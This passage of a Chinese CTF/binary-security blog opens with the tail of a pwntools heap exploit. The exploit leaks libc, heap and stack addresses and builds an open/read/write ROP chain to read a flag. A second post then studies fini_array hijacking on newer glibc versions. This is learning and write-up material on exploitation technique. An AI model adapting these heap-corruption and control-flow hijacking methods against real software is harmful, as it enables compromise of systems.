class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">6</span>)<span class="comment">#防止合并</span></span><br><span class="line"><span class="comment">#泄漏libc以及heap地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">global_max_fast=libc.address+<span class="number">0x3c67f8</span> </span><br><span class="line">pop_rdi=libc.address+<span class="number">0x21112</span></span><br><span class="line">pop_rsi=libc.address+<span class="number">0x202f8</span></span><br><span class="line">pop_rdx_rsi=libc.address+<span class="number">0x1151c9</span></span><br><span class="line">buf=<span class="number">0x602068</span> <span class="comment">#存堆地址</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_heap+<span class="number">0x130</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># edit(1,p64(leak_heap)+p64(heap_base))</span></span><br><span class="line"><span class="comment"># edit(3,p64(0)+p64(0x61)+p64(heap_base-0x130)+p64(heap_base+0x110))</span></span><br><span class="line"><span class="comment"># edit(5,p64(heap_base))</span></span><br><span class="line"><span class="comment"># add(1)  这里是尝试fsop</span></span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#接下来开始攻击buf修改top_chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(leak_libc)+p64(buf))</span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#修复崩溃并且将top_chunk放到buf数组前面，</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;1131796&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;challenge?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xf1</span>).encode())</span><br><span class="line">p.sendafter(<span class="string">&#x27;are!\n&#x27;</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(buf-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(leak_libc)*<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#这次请求会请求到buf数组</span></span><br><span class="line"><span class="comment">#通过全局变量environ泄露栈地址</span></span><br><span class="line">edit(<span class="number">7</span>,p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">stack=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target=stack-<span class="number">0xf0</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(target))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;flag\x00&#x27;</span>)</span><br><span class="line">file_adr=heap_base-<span class="number">0x90</span></span><br><span class="line"><span class="comment">#覆盖栈上的返回地址orw</span></span><br><span class="line">edit(<span class="number">7</span>,p64(target))</span><br><span class="line">orw=flat([</span><br><span class="line">    pop_rdi,file_adr,pop_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,libc.sym[<span class="string">&#x27;open&#x27;</span>],pop_rdi,<span class="number">3</span>,pop_rdx_rsi,<span class="number">0x100</span>,file_adr,libc.sym[<span class="string">&#x27;read&#x27;</span>],pop_rdi,<span class="number">1</span>,libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">])</span><br><span class="line"><span class="comment">#这里吐槽一下远程环境和本地不一样，open时的句柄来到了6，本地是正常的3</span></span><br><span class="line">edit(<span class="number">0</span>,orw)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">高libc版本下fini_array劫持探索</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-23 11:08:57" itemprop="dateCreated datePublished" datetime="2025-10-23T11:08:57+08:00">2025-10-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-19 11:27:37" itemprop="dateModified" datetime="2025-11-19T11:27:37+08:00">2025-11-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在网上偶然发现一种比较底层的控制程序流方法：<code>__libc_csu_fini劫持</code></p>
<p>利用条件是fini_array为可写状态。利用<code>readelf -S ./pwn | grep .fini_array</code>命令可以查看fini_array位置</p>
<p>然而在我利用本地libc运行demo尝试复现时发现:__libc_start_main函数貌似与题目中不太一样，甚至已经找不到__libc_csu_fini函数了，那么这个利用方法到底能否用于高libc版本的程序呢？我打算一探究竟。</p>
<p>首先过一遍c程序的执行流程:<br> start函数（text段的起点）调用了libc_start_main</p>
<p> 在libc_start_main中调用__libc_start_call_main</p>
<p> __libc_start_call_main调用了main函数</p>
<p> 返回__libc_start_call_main中并调用exit退出。</p>
<h4 id="在GLIBC-3-35下，我发现在exit中-libc-csu-fini函数不见了，而取而代之实现对应功能的是-dl-call-fini函数"><a href="#在GLIBC-3-35下，我发现在exit中-libc-csu-fini函数不见了，而取而代之实现对应功能的是-dl-call-fini函数" class="headerlink" title="在GLIBC 3.35下，我发现在exit中__libc_csu_fini函数不见了，而取而代之实现对应功能的是(_dl)_call_fini函数"></a>在GLIBC 3.35下，我发现在exit中__libc_csu_fini函数不见了，而取而代之实现对应功能的是(_dl)_call_fini函数</h4><blockquote>
<p>梳理一下libc_start_main流程(动态链接)：<br>__libc_start_main<br>├── 安全初始化<br>├── 线程局部存储(TLS)初始化<br>├── 堆栈保护设置<br>├── 动态链接器初始化<br>├── 环境变量设置<br>├── 调用全局构造函数<br>│   ├── <code>_init()</code><br>│   ├── <code>frame_dummy()</code> [异常处理框架]<br>│   └── <code>.init_array</code> 中的所有函数<br>↓<br><code>__libc_start_call_main</code> (GLIBC 2.34+)<br>│   ↓<br>│   main() [用户程序]<br>│   ↓<br>│   exit()<br>│       ├── 最后在<code>_dl_call_fini</code>函数内遍历调用fini_array数组</p>
</blockquote>
<p>注：在静态链接的程序exit()最后调用到call_fini()</p>
<p>这里需要详细解释一下exit的流程：<br>exit(status)<br>    ↓ 调用<br><code>__run_exit_handlers(status, &amp;__exit_funcs, true, true)</code><br>    ↓调用<br>   <code> _dl_fini()</code> 进行动态链接器清理<br>    ↓函数执行过程<br>    ↓遍历linkmap生成模块列表<br>    ↓<code>_dl_sort_maps(_dl_loaded, _dl_nloaded, NULL)</code>  ← 为模块排序<br>    ↓遍历排序后的模块列表<br>    ↓对每个模块调用<code>_dl_call_fini</code><br>    ↓调用<code>_IO_cleanup</code>，其中有著名的<code>_IO_flush_all</code><br>执行 <code>.fini_array </code>和 <code>_fini()</code></p>
<p>这里逆一下<code>_dl_call_fini</code>的源码：<br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/1.png"><br>如果在程序执行流中如果有机会通过任意地址写或者数组越界的方式写到fini_array数组的位置，就能实现劫持程序流了？考虑一下题目的两种利用的情景：</p>
<p>1.构造array实现main无限loop</p>
<blockquote>
<p>fini_array[0] &#x3D; __libc_csu_fini<br>fini_array[1] &#x3D; main</p>
</blockquote>
<p>需要注意控制fini_array长度大于2<br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/2.png"><br>通过调试发现存储array长度的数据存在elf的.dynamic段<br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/3.png"><br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/4.png"><br>对.dynamic段的具体解释见:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qfanmingyiq/article/details/124527430">https://blog.csdn.net/qfanmingyiq/article/details/124527430</a><br>简单来说.dynamic 段为动态链接器提供了：</p>
<ul>
<li>依赖关系：需要加载哪些共享库</li>
<li>符号解析：如何查找和解析符号</li>
<li>重定位信息：如何修正地址引用</li>
<li>初始化与终结流程：何时调用构造函数与析构函数</li>
<li>版本控制：符号版本兼容性</li>
</ul>
<p>那么fini array的长度和什么东西有关呢。这里先明确一下fini array存在的意义：为了确保资源正确释放<br>那么什么资源需要释放呢？问ai给出了几种：</p>
<table>
<thead>
<tr>
<th>影响因素</th>
<th>对数量的贡献</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>全局 C++ 对象</td>
<td>+N (每个对象)</td>
<td><code>MyClass obj1, obj2;</code></td>
</tr>
<tr>
<td>destructor 属性</td>
<td>+N (每个函数)</td>
<td><code>__attribute__((destructor))</code></td>
</tr>
<tr>
<td>静态库初始化</td>
<td>+M (库决定)</td>
<td>链接的静态库</td>
</tr>
<tr>
<td>编译器生成</td>
<td>+K (编译器决定)</td>
<td>异常处理清理等</td>
</tr>
</tbody></table>
<p>2.构造array实现无限长的ROP链</p>
<blockquote>
<p>fini_array[0] &#x3D; leave_ret<br>fini_array[1] &#x3D; ret<br>fini_array[2]&#x3D;ROP链子</p>
</blockquote>
<p>这个方法利用的前提是在libc_csu_fini中遍历调用fini_array时函数将栈给迁移到了fini_array上，但是在GLIBC3.35以上用的 _dl_call_fini()中栈并没有迁移到这上面，当然也就失效了。</p>
<h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>综合看来这种利用方法貌似比较过时了(主要局限在fini_array数组的位置不可写)，不过这次对于libc_start_main函数的探索也受益良多，本人对于底层的原理尚有很多待探索的。感受较深的就是版本的更迭也就意味攻击手法的更新也需跟上，那么对底层原理的熟练掌握以及积极发动主观能动思考能力也就不可或缺，加油！</p>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>遇到一道pwnable中的题，用的是2.23-0ubuntu-5版本libc，fini_array数组不可写，然而仍然可以用fini_array来pwn</p>
<p>这里推翻两个先前的想法：</p>
<ul>
<li>Fini_array不可写与libc版本高低有关——并非，其可写性主要在于是否开了RELRO的保护(是否为Full relro)。</li>
<li>fini_array不可写不意味着完全不能利用fini_array劫持程序流</li>
</ul>
<p>题目中利用了对应版本的ld中对于fini_array操作前计算fini_array的操作：</p>
<p>从栈中取出主程序对应的linkmap，并在其中取出dynamic段的fini_array与fini_array_size(full_retro下不可写)，<img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/5.png">然而这个结构体在main函数的时候其实是保存在栈上的！<img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/6.png">这段结构体是可写的，那么如果能够通过格式化字符串等漏洞往栈上这个结构体内固定偏移写入数据，就能控制fini_array到可控地址从而使劫持exit后到程序流！</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/22/Learning/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/22/Learning/" class="post-title-link" itemprop="url">也许很快就会更</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-22 10:27:57" itemprop="dateCreated datePublished" datetime="2025-10-22T10:27:57+08:00">2025-10-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-29 15:21:30" itemprop="dateModified" datetime="2025-10-29T15:21:30+08:00">2025-10-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p><strong>目前状态</strong>: 鉴于过菜还在努力学习中……..</p>
</blockquote>
<hr>
<h3 id="这个博客将会记录"><a href="#这个博客将会记录" class="headerlink" title="这个博客将会记录:"></a>这个博客将会记录:</h3><ul>
<li><strong>Windows 内核学习过程</strong> </li>
<li>**二进制安全 ** 知识记载</li>
<li><strong>CTF pwn方向 Writeups</strong> </li>
<li>一些心得（也许）</li>
</ul>
<hr>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">no_t1me</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
